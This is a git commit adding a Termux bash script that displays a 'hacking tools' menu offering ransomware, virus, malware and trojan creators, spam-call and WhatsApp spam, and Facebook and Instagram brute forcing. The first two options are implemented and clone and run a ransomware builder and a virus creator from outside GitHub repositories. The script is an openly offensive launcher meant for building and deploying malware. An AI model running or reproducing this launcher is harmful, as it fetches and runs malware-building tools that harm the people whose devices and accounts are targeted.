e4dcfae38381ece0d911b8a158e63a522c627f1b
Mr-Ings <62220221+Mr-Ings@users.noreply.github.com>
2020-03-16 16:54:01 +0700

    New

---
+++ IngsSs.sh
@@ -0,0 +1,110 @@
+#usr/bin/sh
+clear
+bi='\033[34;1m' #biru
+i='\033[32;1m' #ijo
+pur='\033[35;1m' #purple
+cy='\033[36;1m' #cyan
+me='\033[31;1m' #merah
+pu='\033[37;1m' #putih
+ku='\033[33;1m' #kuning
+blu='\033[0;36m' #blue
+bli='\033[36;1m' #bluelight
+blk='\033[30;1m' #black
+yel='\033[33;1m' #yellow
+yli='\033[1;33m' #yellowlight
+gri='\033[32;1m' #greenlight
+echo $bli"LOADING DATE "$pu"[ 10% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 20% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 30% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 40% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 50% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 60% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 70% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 80% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 90% ]"
+sleep 1
+echo $bli"LOADING DATE "$pu"[ 100% ]"
+sleep 3
+echo $yli"LOADING DATE "$gri"SUCCESS...!"
+sleep 3
+clear
+echo $me" ████████╗ ██████╗  ██████╗ ██╗     ███████╗██╗███╗   ██╗ ██████╗ ███████╗"
+echo $me" ╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝██║████╗  ██║██╔════╝ ██╔════╝"
+echo $me"    ██║   ██║   ██║██║   ██║██║     ███████╗██║██╔██╗ ██║██║  ███╗███████╗"
+echo $pu"    ██║   ██║   ██║██║   ██║██║     ╚════██║██║██║╚██╗██║██║   ██║╚════██║"
+echo $pu"    ██║   ╚██████╔╝╚██████╔╝███████╗███████║██║██║ ╚████║╚██████╔╝███████║"
+echo $pu"    ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝"
+echo $ku"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo $bli"                      ╔════╗╔═══╗╔═══╗╔╗   ╔═══╗"
+echo $bli"                      ║╔╗╔╗║║╔═╗║║╔═╗║║║   ║╔═╗║"
+echo $bli"                      ╚╝║║╚╝║║ ║║║║ ║║║║   ║╚══╗"
+echo $pu"                         ║║  ║║ ║║║║ ║║║║ ╔╗╚══╗║"
+echo $pu"                         ║║  ║╚═╝║║╚═╝║║╚═╝║║╚═╝║"
+echo $pu"                         ╚╝  ╚═══╝╚═══╝╚═══╝╚═══╝"$gri"            [ V.01.1 ]"
+echo $ku"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬"
+echo $me"           JANGAN LUPA SUBSCRIBE CHANEL YOUTUBE "$pu"[ SAYDOG ]"
+echo $ku"══════════════════════════════════════════════════════════════════════════"
+echo""
+echo $bli"                         AUTHOR :"$pu" MR.INGSS"
+echo $bli"                         TEAM   :"$pu" BLACKCYBERTEAM"
+echo $bli"                      PROGRAM:"$pu" BASH/SHELL"
+echo $bli"                      CONTACT:"$pu" 089524683826"
+echo""
+echo $ku"══════════════════════════════════════════════════════════════════════════"
+echo $i"╔══════════════════════════════════════════════════════════════════════════╗"
+echo $i"║                          [ MENU TOOLS HACKING ]                          ║"
+echo $i"║                                                                          ║"
+echo $i"║════════════════════════════════════╦═════════════════════════════════════║"
+echo $i"║ [ 1 ].RANSOMWARE CREATOR           ║ [ 13 ].                             ║"
+echo $i"║ [ 2 ].VIRUS APP CREATOR            ║ [ 14 ].                             ║"
+echo $i"║ [ 3 ].MALLWARE CREATOR             ║ [ 15 ].                             ║"
+echo $i"║ [ 4 ].SQLI SCANNING                ║ [ 16 ]                              ║"
+echo $i"║ [ 5 ].SPAM-CALL                    ║ [ 17 ].                             ║"
+echo $i"║ [ 6 ].SPAM-WHATSAPP                ║ [ 18 ].                             ║"
+echo $i"║ [ 7 ].VENOM INJECTION              ║ [ 19 ].                             ║"
+echo $i"║ [ 8 ].SAYDOG FRAMEWORK             ║ [ 20 ].                             ║"
+echo $i"║ [ 8 ].BRUTEFORCE-FACEBOOK          ║ [ 21 ].                             ║"
+echo $i"║ [ 9 ].BRUTEFORCE-INSTAGRAM         ║ [ 22 ].                             ║"
+echo $i"║ [ 10 ].TERMUX-THEME                ║ [ 23 ].                             ║"
+echo $i"║ [ 11 ].TROJAN-CREATOR              ║ [ 24 ].                             ║"
+echo $i"║ [ 12 ].METASPLOIT-HELPER           ║ [ 25 ].                             ║"
+echo $i"╚════════════════════════════════════╩═════════════════════════════════════╝"
+read -p "SILAHKAN PILIH TOOLS : " pil
+
+if [ $pil = 1 ]
+then
+clear
+echo $gri"[ INSTALLING RANSOMWARE CREATOR... ]"
+echo ""
+pkg install git
+pkg install python2
+pip2 install requests
+pkg install curl
+git clone https://github.com/saydog/Ransomware-creator
+cd Ransomware-creator
+python ransom.py
+fi
+
+if [ $pil = 2 ]
+then
+clear
+echo $gri"[ INSTALLING VIRUS APP CREATOR... ]"
+echo ""
+pkg update && pkg upgrade
+pkg install git
+pkg install python2
+pip2 install requests
+pip2 install mechanize
+pip2 install tqdm
+git clone https://github.com/BlackCyberAnonim/B-VIRUS
+cd B-VIRUS
+python2 B-VIRUS.py
+fi
